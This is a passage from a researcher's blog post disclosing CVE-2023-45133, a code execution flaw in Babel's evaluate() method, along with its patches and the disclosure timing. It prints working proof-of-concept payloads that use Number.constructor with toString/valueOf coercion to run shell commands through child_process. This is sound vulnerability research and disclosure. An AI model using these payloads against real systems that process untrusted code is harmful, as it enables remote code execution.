<li>When the callee is a member expression, the object is a literal, and the property is a string&#x2F;numeric literal.</li>
</ol>
<p>The most interesting one is the second case:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<br>  object.<span class="hljs-title function_">isIdentifier</span>() &amp;&amp;<br>  property.<span class="hljs-title function_">isIdentifier</span>() &amp;&amp;<br>  <span class="hljs-title function_">isValidObjectCallee</span>(object.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>) &amp;&amp;<br>  !<span class="hljs-title function_">isInvalidMethod</span>(property.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>)<br>) &#123;<br>  context = <span class="hljs-variable language_">global</span>[object.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>];<br>  <span class="hljs-comment">// @ts-expect-error property may not exist in context object</span><br>  func = context[property.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>];<br>&#125;<br><br><span class="hljs-comment">/** snip **/</span><br><span class="hljs-keyword">if</span> (func) &#123;<br>  <span class="hljs-keyword">const</span> args = path.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;arguments&quot;</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">arg</span>) =&gt;</span> evaluateCached(arg, state));<br>  <span class="hljs-keyword">if</span> (!state.<span class="hljs-property">confident</span>) <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-keyword">return</span> func.<span class="hljs-title function_">apply</span>(context, args);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>The only blacklisted method is <code>random</code>, which is a method of the <code>Math</code> object. This means that any other method of either the whitelisted <code>Number</code>, <code>String</code>, or <code>Math</code> objects can be directly referenced.</p>
<p>In JavaScript, all classes are functions. Since <code>Number</code> and <code>String</code> are global JavaScript classes, their <code>constructor</code> property points to the <code>Function</code> constructor.</p>
<p>Therefore, the two expressions below are equivalent:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Number</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;javascript_code_here;&#x27;</span></span>);<br><span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;javascript_code_here;&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>Passing in an arbitrary string to the <code>Function</code> constructor returns a function that will evaluate the provided string as JavaScript code when called.</p>
<p>The AST node generated by <code>Number.constructor(&#39;javascript_code_here;&#39;)</code> contains:</p>
<ul>
<li>A call expression, where<ul>
<li>The callee is a member expression, where<ul>
<li>The object is an identifier, with name whitelisted by <code>VALID_OBJECT_CALLEES</code></li>
<li>The property is an identifier, not blacklisted by <code>INVALID_METHODS</code></li>
</ul>
</li>
<li>The arguments are a single string literal, containing the code to be executed.</li>
</ul>
</li>
</ul>
<p>Therefore, the code is considered safe to evaluate, and we have successfuly crafted a malicious function.</p>
<p>However, it is crucial to note that this <em>cannot call the function on its own</em>. It only <strong>creates an anonymous function</strong>.</p>
<p>So, how exactly <em>can</em> we call the function? This is where the second piece of the puzzle comes in: <strong>object expressions</strong>.</p>
<h3 id="Handling-of-Object-Expressions"><a href="#Handling-of-Object-Expressions" class="headerlink" title="Handling of Object Expressions"></a>Handling of Object Expressions</h3><p>Within Babel’s <code>_evaluate</code> method, an <code>ObjectExpression</code> node undergoes recursive evaluation, producing a true JavaScript object. There’s no limitation on key names for <code>ObjectProperty</code>. As long as every <code>ObjectProperty</code> child in the <code>ObjectExpression</code> yields <code>confident: true</code> from <code>_evaluate()</code>, we can obtain a JavaScript object with custom keys&#x2F;values.</p>
<p>A key property to leverage is <code>toString</code> (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString">MDN Reference</a>). Defining this property on an object to a function we control will allow us to execute arbitrary code when the object is converted to a string.</p>
<p>This is exactly what we do in the payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">String</span>((&#123;  <span class="hljs-attr">toString</span>: <span class="hljs-title class_">Number</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span></span>)&#125;));<br></code></pre></td></tr></table></figure>

<p>We’ve assigned our malicious function, crafted via the <code>Function</code> constructor, to the <code>toString</code> property of the object. Thus, when this object undergoes a string conversion, it gets triggered and executed.</p>
<p>In the provided example, we pass the object to the <code>String</code> function, given its status as a whitelisted function (referenced in case 1). Still, the <code>String</code> constructor isn’t mandatory. Implicit type coercion in JavaScript can also trigger our malicious function, as demonstrated in these alternative payload formats:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&quot;</span>+((&#123;  <span class="hljs-attr">toString</span>: <span class="hljs-title class_">Number</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span></span>)&#125;));<br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">1</span>+((&#123;  <span class="hljs-attr">valueOf</span>: <span class="hljs-title class_">Number</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span></span>)&#125;));<br></code></pre></td></tr></table></figure>

<p>The first example employs type-coercion to transform the object into a string. In contrast, the second example utilizes type-coercion to convert it into a number, as detailed in <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf">Object.prototype.valueOf()</a>. Both examples exploit the <code>_evaluate()</code> method’s approach to handling <code>BinaryExpression</code> nodes, which directly performs the operation after recursively evaluating the left and right operands.</p>
<h2 id="The-Patch"><a href="#The-Patch" class="headerlink" title="The Patch"></a>The Patch</h2><p>Upon disclosing this vulnerability, I was impressed by the swift response from the Babel team, who promptly rolled out a patch. This patch was released in two parts:</p>
<p>The first of which was a workaround for all of the affected official Babel packages, by guarding the calls to <code>evalute()</code> with an <code>isPure()</code> check. <a target="_blank" rel="noopener" href="https://github.com/babel/babel/blob/4c155667cf50291132089a4556cd3c6cc9d2e640/packages/babel-traverse/src/scope/index.ts#L871">isPure</a> inherently prevents this bug, as it returns false for all <code>MemberExpression</code> nodes. <a target="_blank" rel="noopener" href="https://github.com/babel/babel/pull/16032">PR #16032: Update babel-polyfills packages</a></p>
<p>The subsequent step involved refining the <code>evaluate()</code> function. This adjustment ensured that all inherited methods, not only <code>constructor</code>, were prevented from being called. <a target="_blank" rel="noopener" href="https://github.com/babel/babel/pull/16033">PR #16033: Only evaluate own String&#x2F;Number&#x2F;Math methods</a></p>
<p>After the fixes were implemented, GitHub staff issued <strong>CVE-2023-45133</strong> for the security advisory.</p>
<h2 id="A-side-note-on-disclosure-timing"><a href="#A-side-note-on-disclosure-timing" class="headerlink" title="A side note on disclosure timing"></a>A side note on disclosure timing</h2><p>You might have noticed that this blog post was released on the same day as the security advisory. Usually for critical vulnerabilities, it’s customary to wait a while before disclosing a proof of concept. However, I believe this disclosure timing is justifiable for a few reasons:</p>
<p>Predominantly, the vast majority of Babel users remain unaffected by this vulnerability. Babel is primarily utilized for refactoring and transpiling <strong>one’s own code</strong>, which means the typical use case doesn’t expose users to this risk. It’s improbable that many have server-side implementations that accept and process arbitrary code from users through the compilation plugins or the invocation of <code>path.evaluate</code>. Furthermore, there are really only a couple real use-cases for using Babel to analyze untrusted code on the server-side:</p>
<ol>
<li>Reverse engineering bot mitigation software, etc.</li>
<li>Malware analysis</li>
</ol>
<p>In the first case, I doubt any legitimate bot mitigation entity would try to attempt Remote Code Execution (RCE) due to the legal ramifications. Meanwhile, professionals using Babel for malware reversal possess the expertise to conduct their analyses within controlled, sandboxed environments. Thus, the risk to the community, in real-world scenarios, remains minimal.</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Discovering and delving into this vulnerability was a fun experience. I initially stumbled upon the vulnerability during a brainstorming session for a Babel-based challenge for UofTCTF’s upcoming capture the flag competition, where I was focusing on an entirely different, non-security-related “bug”.</p>
<p>This vulnerability predominantly impacts those integrating untrusted code with Babel. Unfortunately, this places individuals leveraging Babel for “static deobfuscation” directly in the crosshairs of this attack vector.</p>
<p>There’s a touch of irony in the fact that my first credited CVE emerged from reverse engineering Babel - the very tool I often employ for reverse engineering JavaScript, and the topic of all of my previous posts 🤣.</p>
<p>This was a great learning experience, and hopefully this write-up was useful to you as well. Thanks for reading, and take care!</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2023-45133">CVE-2023-45133</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/babel/babel/security/advisories/GHSA-67hx-6x53-jw92">GitHub Advisory Database: Arbitrary code execution when compiling specifically crafted malicious code</a></li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Exploitation/" class="category-chain-item">Exploitation</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Javascript/">#Javascript</a>
      
        <a href="/tags/Babel/">#Babel</a>
      
        <a href="/tags/Reverse-Engineering/">#Reverse Engineering</a>
      
        <a href="/tags/Exploitation/">#Exploitation</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel</div>
      <div>http://steakenthusiast.github.io/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>William Khem Marquez</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>October 11, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/06/14/Deobfuscating-Javascript-via-AST-Deobfuscating-a-Peculiar-JSFuck-style-Case/" title="Deobfuscating Javascript via AST: A Peculiar JSFuck-esque Case">
                        <span class="hidden-mobile">Deobfuscating Javascript via AST: A Peculiar JSFuck-esque Case</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
